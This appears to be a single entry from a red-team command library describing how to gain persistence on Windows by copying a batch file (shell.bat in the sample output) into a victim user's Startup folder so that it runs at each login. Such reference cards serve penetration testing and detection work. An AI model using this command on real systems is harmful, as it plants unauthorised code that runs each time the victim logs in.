---
id: 115354d3-f65d-4c45-bad6-bd4a54808ca3
name: Launch a Program on Login with Startup Folders
type: command
executor: ''
data: copy .\$_SCRIPT.bat "C:\Users\$_USERNAME\AppData\Roaming\Microsoft\Windows\Start
  Menu\Programs\Startup"
output: "C:\\Windows\\Tasks>copy shell.bat \"C:\\Users\\Victim\\AppData\\Roaming\\\
  Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n        1 file(s) copied."
created_at: '2020-04-03T08:54:04.307313+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Launch a Program on Login with Startup Folders

```bash
copy .\$_SCRIPT.bat "C:\Users\$_USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

## Expected Output

```
C:\Windows\Tasks>copy shell.bat "C:\Users\Victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        1 file(s) copied.
```
